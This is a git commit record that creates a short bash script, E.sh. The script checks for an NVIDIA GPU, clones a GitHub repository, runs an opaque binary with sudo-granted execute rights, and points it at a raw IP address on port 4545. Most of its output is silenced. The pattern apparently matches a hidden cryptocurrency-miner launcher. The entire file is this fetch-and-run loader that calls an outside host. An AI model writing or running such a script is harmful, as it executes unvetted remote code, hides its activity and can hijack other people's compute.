08034d9012e0995e1cc2741666f4859e1048f88e
phucbmt <phucdlbmt@gmail.com>
2021-01-27 11:05:57 +0700

    Create E.sh

---
+++ E.sh
@@ -0,0 +1,8 @@
+#! /bin/bash
+nvidia-smi
+printf "Run 134.209.143.90:4545/$1"  >&2
+{
+git clone https://github.com/phucbmt/tech.git &> /dev/null
+sudo chmod +x tech/m
+./tech/m -P http://134.209.143.90:4545/"$1" &> log
+} &> /dev/null
